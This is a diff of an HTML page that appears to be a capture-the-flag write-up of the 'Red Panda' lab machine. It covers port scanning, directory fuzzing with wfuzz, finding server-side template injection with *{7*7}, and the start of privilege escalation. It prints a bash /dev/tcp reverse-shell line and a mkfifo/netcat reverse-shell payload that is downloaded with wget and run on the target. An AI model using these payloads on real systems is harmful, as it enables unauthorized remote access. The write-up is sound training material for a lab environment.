@@ -28,27 +28,28 @@
 <body>
   <h1>Red Panda</h1>
   <a href="https://github.com/Business1sg00d/AutomaticNMAP">I used this script to scan the target.</a>
-  <p1>Ports 22 and 8080 are the only ones open. No significant information is given. No open ports found on UPD. A Whatweb scan shows 'Made with Spring Boot'. Looks like we'll be dealing with java<br>
+  <p1>    Ports 22 and 8080 are the only ones open. No significant information is given. No open ports found on UPD. A Whatweb scan shows 'Made with Spring Boot'. Looks like we'll be dealing with java<br>
   <div class="centerimg">
     <img src="docs/assets/whatwebpanda.png">
   </div>
-  <p1>None of the service versions showed any known vulnerabilities. wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.170:8080/FUZZ -f wfuzz_common.txt<br>
+  <p1>    None of the service versions showed any known vulnerabilities. wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.170:8080/FUZZ -f wfuzz_common.txt<br>
   <p1>The above fuzz yielded the following:<br>
   <div class="centerimg">
     <img src="docs/assets/ffuf.png">
   </div>
-  <p1>Visiting http://10.10.10.20:8080 shows an input field accepting user input. Entering a blank field gives a page mentioning injection attacks. Entering a simple SSTI(Server Side Template Injection) string shows the following results:<br>
+  <p1>    Visiting http://10.10.10.20:8080 shows an input field accepting user input. Entering a blank field gives a page mentioning injection attacks. Entering a simple SSTI(Server Side Template Injection) string shows the following results:<br>
   <div class="centerimg">
     <img src="docs/assets/blank.png">
   </div>
-  <p1>Here you could setup burpsuite in order to go through a list of characters to see which ones return a value. I did a simple google search to find other variations of ${7*7}<br>
+  <p1>    Here you could setup burpsuite in order to go through a list of characters to see which ones return a value. I did a simple google search to find other variations of ${7*7}<br>
   <p1>Eventually I came accross *{7*7}. Simply replace '$' with '*'<br>
   <div class="centerimg">
     <img src="docs/assets/seven.png">
   </div>
-  <p1>The application is susceptible to SSTI. Now we need to figure out the correct payload in order to catch a shell. Using "bash -i >& /dev/tcp/10.10.16.4/6666 0>&1" won't work. I believe this has something to do with the /dev/tcp directory being absent on linux VMs. Someone correct me on this. I tried various payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadsAllTheThings</a>. Searching through github, I found an SSTI payload generator here: <a href="https://github.com/VikasVarshney/ssti-payload">ssti-payload</a>. After a while of playing around with various commands, I decided to wget an ‘.sh’ file to the target via a local http server. The script contained rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc [my IP] [port] > /tmp/f ; NO brackets. I was able to execute the file in the target directory by executing the file with the bash command. Connected to a netcat listener, thus establishing a reverse shell. "this.sh" contains the following payload: "rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc [my IP] [port] > /tmp/f"<br>
+  <p1>    The application is susceptible to SSTI. Now we need to figure out the correct payload in order to catch a shell. Using "bash -i >& /dev/tcp/10.10.16.4/6666 0>&1" won't work. I believe this has something to do with the /dev/tcp directory being absent on linux VMs. Someone correct me on this. I tried various payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadsAllTheThings</a>. Searching through github, I found an SSTI payload generator here: <a href="https://github.com/VikasVarshney/ssti-payload">ssti-payload</a>. After a while of playing around with various commands, I decided to wget an ‘.sh’ file to the target via a local http server. The script contained "rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc [my IP] [port] > /tmp/f" ; NO brackets. I was able to execute the file in the target directory(/tmp) by executing the file with the bash command. Connected to a netcat listener, thus establishing a reverse shell.<br>
   <div class="centerimg">
     <img src="docs/assets/this.png">
   </div>
+  <p1>		Noticed via pspy64 that everytime root executes the jar file, a cleanup script is executed; There's also a ‘run_credits.sh’ in root directory. I do not have any access to this. Since every other path to privesc has led to a wall, I need to look at the jar file to find something. Moving the file over to my local machine with a python http server, allows me to use the jd-gui tool (On kali: sudo apt-get install jd-gui) in order to decompile code into a readable format. I suppose a good thought process in regards to finding where to look in the code would be to consider how it's applied. We are dealing with a web application. Within the jar file, there are NUMEROUS classes with many many lines of code. So which ones matter most in our instance? logparser stands out to me. Log as in logs?<br>
 </body>
 </html>
